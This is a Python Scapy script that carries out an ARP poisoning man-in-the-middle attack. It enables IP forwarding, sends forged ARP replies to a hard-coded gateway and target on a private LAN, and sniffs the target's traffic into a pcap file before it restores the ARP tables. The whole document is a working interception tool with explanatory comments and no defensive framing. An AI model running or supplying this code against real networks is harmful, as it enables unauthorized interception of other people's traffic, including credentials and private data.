from scapy.all import *
import os
import signal
import sys
import threading
import time

# ARP Poison parameters
gateway_ip = "192.168.1.1"
target_ip = "192.168.1.102"
packet_count = 1000
conf.iface = "enp0s3"

# turn off output
conf.verb = 0

# Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Receiving an ARP reply with MAC Address
def get_mac(ip_address):
    #ARP request is constructed. sr function stands for send/ receive
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)

    # return the MAC address from a response
    for s,r in resp:
        return r[ARP].hwsrc
    return None

# Restore the network by broadcasting ARP Reply with
# correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    # restore using send function of scapy
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[!] Disabling IP forwarding")
    #Disable IP Forwarding
    os.system("sysctl -w net.ipv4.ip_forward=0")
    #kill process
    os.kill(os.getpid(), signal.SIGTERM)

# Keep sending false ARP replies to put our machine in the middle to intercept packets
def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[!] Started ARP poison attack [CTRL-C to stop]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[!] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

print("[!] Starting script on interface %s" % conf.iface)
print("[!] Enabling IP forwarding")
os.system("sysctl -w net.ipv4.ip_forward=1")

gateway_mac = get_mac(gateway_ip)

#checking the macs
if gateway_mac is None:
    print("[x] Failed to get gateway MAC. Exiting.")
    sys.exit(0)
else:
    print("[+] Gateway %s is at %s" % (gateway_ip,gateway_mac))
    target_mac = get_mac(target_ip)

if target_mac is None:
    print("[x] Failed to get target MAC. Exiting.")
    sys.exit(0)
else:
    print("[+] Target %s is at %s" % (target_ip,target_mac))

#ARP poison thread
poison_thread = threading.Thread(target=poison_target, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()

#Sniff traffic and write to file. Capture is filtered on target machine
try:
    sniff_filter = "ip host " + target_ip
    print("[!] Starting network capture. Packet Count: %s. Filter: %s" % (packet_count, sniff_filter))
    packets = sniff(filter=sniff_filter, iface=conf.iface, count=packet_count)
    wrpcap("sniffed.pcap", packets)
    print("[!] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
except KeyboardInterrupt:
    print("[!] Stopping network capture..Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
